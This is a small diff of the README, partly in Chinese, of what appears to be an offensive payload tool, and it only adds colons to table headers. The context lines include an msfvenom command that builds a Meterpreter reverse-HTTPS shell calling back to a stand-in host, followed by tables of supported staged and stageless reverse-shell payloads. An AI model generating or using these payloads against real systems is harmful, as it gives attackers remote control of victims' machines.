@@ -30,13 +30,13 @@ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=www.example.com LPORT=443
 
 支持的payload:
 
-|  Staged (payload.bat\|ps1\|txt\|exe)   |
+|  Staged (payload.bat\|ps1\|txt\|exe):   |
 |  :----  |
 | windows/meterpreter/reverse_winhttps  |
 | windows/meterpreter/reverse_https  |
 | windows/x64/meterpreter/reverse_https  |
 
-|  Stageless (binary.exe)   |
+|  Stageless (binary.exe):   |
 |  :----  |
 | windows/meterpreter_reverse_https  |
 | windows/x64/meterpreter_reverse_https  |
